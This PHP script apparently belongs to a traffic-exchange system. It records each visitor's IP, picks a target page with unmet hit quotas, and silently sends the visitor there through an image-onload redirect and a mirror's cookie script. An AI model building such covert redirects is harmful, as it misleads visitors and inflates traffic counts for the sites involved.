<?
include ('../scripts/common.inc');
$done=array();
$ip_w=sprintf("%u",ip2long($_SERVER['REMOTE_ADDR']));
$sql='select site_id from traff_ips where ip="'.$ip_w.'" and DATE(`date`)=CURDATE()';
#echo htmlspecialchars($sql).'<br><br>';
$result=sql($sql);
if(mysql_num_rows($result))
	while($row=mysql_fetch_row($result))
		$done[]=$row[0];
$sql='select (traff_dates.hosts-traff_dates.done) AS diff,traff_dates.id,traff_site_pages.site_id,CONCAT(traff_sites.url,traff_site_pages.page)as url from traff_dates,traff_sites,traff_site_pages where traff_site_pages.id=traff_dates.page_id and traff_sites.id=traff_site_pages.site_id and CURDATE() between date1 and date2 and done<hosts';
if(sizeof($done))
	$sql.=' and site_id not in ("'.implode('","',$done).'")';
$sql.=' ORDER BY priority desc,diff DESC LIMIT 1';
#echo htmlspecialchars($sql).'<br><br>';die;
$result=sql($sql);
if(!mysql_num_rows($result))
	die;#nothing to do
	
$row=mysql_fetch_array($result);
$sql='update traff_dates set done=done+1 where id="'.$row['id'].'"';
sql($sql);
$sql='insert into traff_ips values("","'.$row['site_id'].'","'.$ip_w.'",CONCAT(CURDATE()," ",CURTIME()))';
#echo $sql;
sql($sql);

$sql='select cookie_script,redirect_script from traff_mirrors order by status desc,priority desc limit 1';
$mirror=mysql_fetch_array(sql($sql));
#setcookie('redirect_c',$row['url'],time()+3600,'/');
#echo '<script type="text/javascript">window.location = "http://palantir.in/?redirect_c='.$row['url'].'";</script>';
$cookie_script=$mirror['cookie_script'].'?url='.urlencode($row['url']);

Header('Expires: Mon, 26 Jul 2002 05:00:00 GMT');
HEADER('Last-Modified: '.gmdate('D, d M Y H:i:s').'GMT');
HeAdEr('Cache-Control: no-cache, must-revalidate');
hEaDeR('Pragma: no-cache');
?>
<html><head></head><body><img src="<?=$cookie_script;?>" onload="javascript:window.location = '<?=$mirror['redirect_script'];?>'"></body></html>